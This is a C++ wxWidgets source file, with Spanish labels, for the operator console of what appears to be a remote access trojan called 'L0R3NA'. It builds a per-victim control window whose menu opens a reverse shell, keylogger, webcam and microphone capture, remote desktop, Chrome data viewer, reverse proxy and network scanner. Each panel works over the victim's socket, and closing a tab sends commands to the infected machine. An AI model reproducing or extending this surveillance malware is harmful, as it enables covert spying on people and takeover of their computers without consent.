#include "frame_client.hpp"
#include "frame_remote_desktop.hpp"
#include "panel_file_manager.hpp"
#include "panel_process_manager.hpp"
#include "panel_microfono.hpp"
#include "panel_reverse_shell.hpp"
#include "panel_transferencias.hpp"
#include "panel_keylogger.hpp"
#include "panel_camara.hpp"
#include "panel_wmanager.hpp"
#include "panel_info_chrome.hpp"
#include "panel_usuarios.hpp"
#include "panel_reverse_proxy.hpp"
#include "panel_escaner.hpp"
#include "panel_fun.hpp"
#include "server.hpp"
#include "misc.hpp"

extern Servidor* p_Servidor;
extern std::mutex vector_mutex;

wxBEGIN_EVENT_TABLE(FrameCliente, wxFrame)
    EVT_CLOSE(FrameCliente::OnClose)
    EVT_AUINOTEBOOK_PAGE_CLOSE(wxID_ANY, FrameCliente::OnClosePage)
wxEND_EVENT_TABLE()

wxBEGIN_EVENT_TABLE(MyTreeCtrl, wxTreeCtrl)
    EVT_TREE_ITEM_ACTIVATED(EnumIDS::TreeCtrl_ID, MyTreeCtrl::OnItemActivated)
wxEND_EVENT_TABLE()

FrameCliente::FrameCliente()
    :wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, "Titulo", wxDefaultPosition, wxDefaultSize) {
    //Main Sizer
    wxBoxSizer* main_sizer = new wxBoxSizer(wxVERTICAL);

    //////////////////////////////////////////////////
    //Administrador de archivos
    //////////////////////////////////////////////////
    wxPanel* pnl_AdminArchivos = new wxPanel(this, wxID_ANY, wxDefaultPosition);
    wxStaticBoxSizer* box_admin = new wxStaticBoxSizer(wxVERTICAL, pnl_AdminArchivos, "Administrador de archivos");
    
    pnl_AdminArchivos->SetBackgroundColour(wxColour(200, 200, 200));
    
    pnl_AdminArchivos->SetSizer(box_admin);
    //////////////////////////////////////////////////
    //////////////////////////////////////////////////

    
    //////////////////////////////////////////////////
    //Panel Monitoreo
    //////////////////////////////////////////////////
    wxPanel* pnl_Monitoreo = new wxPanel(this, wxID_ANY, wxDefaultPosition);
    wxStaticBoxSizer* box_monitoreo = new wxStaticBoxSizer(wxVERTICAL, pnl_Monitoreo, "Monitoreo");

    pnl_Monitoreo->SetBackgroundColour(wxColour(100, 100, 100));
    
    wxStaticText* lbl1 = new wxStaticText(pnl_Monitoreo, wxID_ANY, "Label");
    wxButton* btn_1 = new wxButton(pnl_Monitoreo, wxID_ANY, "Test");

    box_monitoreo->Add(lbl1, 0);
    box_monitoreo->Add(btn_1, 0, wxALL | wxEXPAND);
    pnl_Monitoreo->SetSizer(box_monitoreo);
    //////////////////////////////////////////////////
    //////////////////////////////////////////////////



    //////////////////////////////////////////////////
    //Botones para lanzar modulos
    //////////////////////////////////////////////////
    wxPanel* pnl_Mods = new wxPanel(this, wxID_ANY, wxDefaultPosition);
    wxStaticBoxSizer* box_mod = new wxStaticBoxSizer(wxVERTICAL, pnl_Mods, "Modulos");

    pnl_Mods->SetBackgroundColour(wxColour(50, 50, 50));

    wxButton* btn_AdmVentanas = new wxButton(pnl_Mods, wxID_ANY, "Adm. Ventanas");
    wxButton* btn_EscanerRed = new wxButton(pnl_Mods, wxID_ANY, "Escaner de Red");
    wxButton* btn_AdmProcesos = new wxButton(pnl_Mods, wxID_ANY, "Adm. Procesos");
    wxButton* btn_RemoteDesk = new wxButton(pnl_Mods, wxID_ANY, "Escritorio Remoto");
    wxButton* btn_Informacion = new wxButton(pnl_Mods, wxID_ANY, "Informacion");
    wxButton* btn_Bromas = new wxButton(pnl_Mods, wxID_ANY, "Bromas");

    wxGridSizer* btnGrid = new wxGridSizer(3, 2, 1, 1);
    btnGrid->Add(btn_AdmVentanas);
    btnGrid->Add(btn_EscanerRed);
    btnGrid->Add(btn_AdmProcesos);
    btnGrid->Add(btn_RemoteDesk);
    btnGrid->Add(btn_Informacion);
    btnGrid->Add(btn_Bromas);

    box_mod->Add(btnGrid, 1, wxALL | wxEXPAND);

    pnl_Mods->SetSizer(box_mod);
    //////////////////////////////////////////////////
    //////////////////////////////////////////////////



    //////////////////////////////////////////////////
    //proxy inversa
    //////////////////////////////////////////////////
    wxPanel* pnl_Proxy = new wxPanel(this, wxID_ANY, wxDefaultPosition);
    wxStaticBoxSizer* box_proxy = new wxStaticBoxSizer(wxVERTICAL, pnl_Proxy, "Proxy Inversa");

    pnl_Proxy->SetBackgroundColour(wxColour(150, 150, 150));

    box_proxy->Add(new wxStaticText(pnl_Proxy, wxID_ANY, "Puerto local"), 0, wxALL | wxEXPAND);
    box_proxy->Add(new wxTextCtrl(pnl_Proxy, wxID_ANY, "8080"), 0, wxALL | wxEXPAND);
    box_proxy->Add(new wxButton(pnl_Proxy, wxID_ANY, "Iniciar"), 0, wxALL | wxEXPAND);
    box_proxy->Add(new wxButton(pnl_Proxy, wxID_ANY, "Detener"), 0, wxALL | wxEXPAND);

    pnl_Proxy->SetSizer(box_proxy);
    //////////////////////////////////////////////////
    //////////////////////////////////////////////////


    wxBoxSizer* dashboard_sizer = new wxBoxSizer(wxVERTICAL);
    dashboard_sizer->Add(pnl_AdminArchivos, 0, wxALL | wxEXPAND);


    wxBoxSizer* all_mods = new wxBoxSizer(wxHORIZONTAL);
    all_mods->Add(pnl_Monitoreo, 0, wxALL | wxEXPAND);
    all_mods->Add(pnl_Mods, 0, wxALL | wxEXPAND);
    all_mods->Add(pnl_Proxy, 0, wxALL | wxEXPAND);
    
    main_sizer->Add(dashboard_sizer, 0, wxALL | wxEXPAND);
    main_sizer->Add(all_mods, 0, wxALL | wxEXPAND);

    this->SetSizer(main_sizer);
}


FrameCliente::FrameCliente(std::string strID, SOCKET sckID, std::string strIP)
    : wxFrame(nullptr, EnumIDS::ID_Panel_Cliente, ":v", wxDefaultPosition, wxDefaultSize, wxDEFAULT_FRAME_STYLE, strID.substr(0, strID.find('/'))) {

    SetTransparent(245);

    this->sckCliente = sckID;
    int npos = strID.find('/', 0);
    this->strClienteID = strID.substr(0, npos);
    //this->strIP = strIP;

    wxString strTitle = "[";
    strTitle.append(strID.c_str());
    strTitle.append("] - Admin");
    this->SetTitle(strTitle);
    
    wxPanel* pnl_Left = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
    wxPanel* pnl_Right = new wxPanel(this, wxID_ANY, wxDefaultPosition, wxDefaultSize);
    
    this->m_tree = new MyTreeCtrl(pnl_Left, EnumIDS::TreeCtrl_ID,wxDefaultPosition, wxSize(180, 450), this->strClienteID, strIP, sckID);
    
    wxTreeItemId rootC           = this->m_tree->AddRoot(                    wxT("CLI"));
    wxTreeItemId rootAdmin       = this->m_tree->AppendItem(rootC,       wxT("[Admin]"));
    wxTreeItemId rootSurveilance = this->m_tree->AppendItem(rootC,         wxT("[Spy]"));
    wxTreeItemId rootInformation = this->m_tree->AppendItem(rootC, wxT("[Informacion]"));
    wxTreeItemId rootNetwork     = this->m_tree->AppendItem(rootC,         wxT("[Red]"));
    wxTreeItemId rootMisc        = this->m_tree->AppendItem(rootC,        wxT("[Misc]"));

    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Archivos"));
    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Procesos"));
    this->m_tree->AppendItem(rootAdmin, wxT("Admin de Ventanas"));
    this->m_tree->AppendItem(rootAdmin,     wxT("Reverse Shell"));
    this->m_tree->AppendItem(rootAdmin,    wxT("Transferencias"));

    //this->m_tree->AppendItem(rootAdmin, wxT("Persistencia"));

    this->m_tree->AppendItem(rootSurveilance,         wxT("Keylogger"));
    this->m_tree->AppendItem(rootSurveilance,            wxT("Camara"));
    this->m_tree->AppendItem(rootSurveilance,         wxT("Microfono"));
    this->m_tree->AppendItem(rootSurveilance, wxT("Escritorio Remoto"));

    this->m_tree->AppendItem(rootInformation, wxT("Usuarios"));
    wxTreeItemId rootBrowsers = this->m_tree->AppendItem(rootInformation, wxT("Navegadores"));
    this->m_tree->AppendItem(rootBrowsers, wxT("Chrome"));

    this->m_tree->AppendItem(rootNetwork, wxT("Proxy Inversa"));
    this->m_tree->AppendItem(rootNetwork, wxT("Escaner de Red"));

    this->m_tree->AppendItem(rootMisc, wxT("Diversion"));

    //Sizer para hacer el treeview dinamico al hacer resize
    wxBoxSizer* pnl_left_Sizer = new wxBoxSizer(wxHORIZONTAL);
    pnl_left_Sizer->Add(this->m_tree, 1, wxEXPAND | wxALL, 2);
    pnl_Left->SetSizer(pnl_left_Sizer);
    //----------------------------------------------

    this->m_tree->p_Notebook = new wxAuiNotebook(pnl_Right, wxID_ANY, wxDefaultPosition, wxDefaultSize,
        wxAUI_NB_CLOSE_ON_ACTIVE_TAB | wxAUI_NB_DEFAULT_STYLE | wxAUI_NB_TAB_EXTERNAL_MOVE | wxNO_BORDER);

    //Sizer para el notebook del lado derecho
    wxBoxSizer* pnl_right_Sizer = new wxBoxSizer(wxHORIZONTAL);
    pnl_right_Sizer->Add(this->m_tree->p_Notebook, 1, wxEXPAND | wxALL, 2);
    pnl_Right->SetSizer(pnl_right_Sizer);
    //----------------------------------------------

    wxHtmlWindow* html = new wxHtmlWindow(this->m_tree->p_Notebook, wxID_ANY, wxDefaultPosition, wxSize(200, 200));
    wxString htmlsource = "<center><h2>L0R3NA v0.1</h2><br>#Honduras</center>";
    html->SetPage(htmlsource);
    html->SetSize(wxSize(200, 200));

    this->m_tree->p_Notebook->Freeze();
    this->m_tree->p_Notebook->AddPage(html, ":v", true);
    this->m_tree->p_Notebook->Thaw();
    
    wxBoxSizer* sizer = new wxBoxSizer(wxHORIZONTAL);

    sizer->Add(pnl_Left, 0, wxEXPAND | wxALL, 2);
    sizer->Add(pnl_Right, 1, wxEXPAND | wxALL, 2);
    
    this->SetSizerAndFit(sizer);

    SetClientSize(700, 450);


#ifdef DEBUG_DESIGN_LIMITS
    SetBackgroundColour(wxColour(255, 255, 255, 128)); // Establecer el color de fondo
    pnl_Left->SetBackgroundColour(wxColor(255, 0, 0));
    pnl_Right->SetBackgroundColour(wxColor(0, 255, 0));
    html->SetBackgroundColour(wxColor(0, 0, 255));
#endif
    
}

void FrameCliente::OnClosePage(wxAuiNotebookEvent& event) {
    int closedPage = event.GetSelection();
    wxString pageTitle = this->m_tree->p_Notebook->GetPageText(closedPage);
    if (pageTitle == "Reverse Shell") {
        //Enviar comando para cerrar shell al cerra la tab
        p_Servidor->cChunkSend(this->sckCliente, "exit\r\n", 6, 0, false, EnumComandos::Reverse_Shell_Command);
    }
    event.Skip();
}

void FrameCliente::OnClose(wxCloseEvent& event) {
    int iIndex = p_Servidor->IndexOf(this->strClienteID);

    //Talvez remplazar este por uno que cierre todos los modulos que estan corriendo?
    if (iIndex != -1) {
        p_Servidor->vc_Clientes[iIndex]->m_setFrameVisible(false);
        p_Servidor->cChunkSend(this->sckCliente, DUMMY_PARAM, sizeof(DUMMY_PARAM), 0, false, EnumComandos::CLI_KSWITCH);
    }
    event.Skip();
}

//Al hacer doble click en uno de los modulos del panel izquierdo
void MyTreeCtrl::OnItemActivated(wxTreeEvent& event) {
    wxTreeItemId itemID = event.GetItem();
    wxString wStr = GetItemText(itemID);
    
    bool isFound = false;
    //Si el panel/frame ya esta abierto solo hacer focus
    for (int i = 0; i < this->p_Notebook->GetPageCount(); i++) {
        if (this->p_Notebook->GetPageText(i) == wStr) {
            this->p_Notebook->GetPage(i)->SetFocus();
            isFound = true;
            break;
        }
    }
    //GetPageCount
    if (wStr[0] != '[' && isFound == false) {
        this->p_Notebook->Freeze();

        if (wStr == "Reverse Shell") {
            this->p_Notebook->AddPage(new panelReverseShell(this, this->sckCliente), wStr, true);
        } else if (wStr == "Admin de Archivos") {
            this->p_Notebook->AddPage(new panelFileManager(this, this->sckCliente, this->strClienteID, this->strClienteIP), wStr, true);
        } else if (wStr == "Admin de Procesos") {
            this->p_Notebook->AddPage(new panelProcessManager(this, this->sckCliente), wStr, true);
        } else if (wStr == "Keylogger") {
            this->p_Notebook->AddPage(new panelKeylogger(this, this->sckCliente), wStr, true);
        } else if (wStr == "Microfono") {
            this->p_Notebook->AddPage(new panelMicrophone(this,this->sckCliente), wStr, true);
        } else if (wStr == "Camara") {
            this->p_Notebook->AddPage(new panelCamara(this, this->sckCliente), wStr, true);
        } else if (wStr == "Escritorio Remoto") {
            frameRemoteDesktop* frm_temp = DBG_NEW frameRemoteDesktop(this, this->sckCliente);
            frm_temp->Show(true);
        } else if (wStr == "Transferencias") {
            this->p_Notebook->AddPage(new panelTransferencias(this, this->strClienteID), wStr, true);
        } else if (wStr == "Admin de Ventanas") {
            this->p_Notebook->AddPage(new panelWManager(this, this->sckCliente), wStr, true);
        } else if (wStr == "Chrome") {
            this->p_Notebook->AddPage(new panelInfoChrome(this, this->sckCliente), wStr, true);
        } else if (wStr == "Usuarios") {
            this->p_Notebook->AddPage(new panelUsuarios(this, this->sckCliente), wStr, true);
        } else if (wStr == "Proxy Inversa") {
            this->p_Notebook->AddPage(new panelReverseProxy(this, this->sckCliente), wStr, true);
        } else if (wStr == "Escaner de Red") {
            this->p_Notebook->AddPage(new panelEscaner(this, this->sckCliente), wStr, true);
        } else if (wStr == "Diversion") {
            this->p_Notebook->AddPage(new panelFun(this, this->sckCliente), wStr, true);
        }

        this->p_Notebook->Thaw();
    } 
}
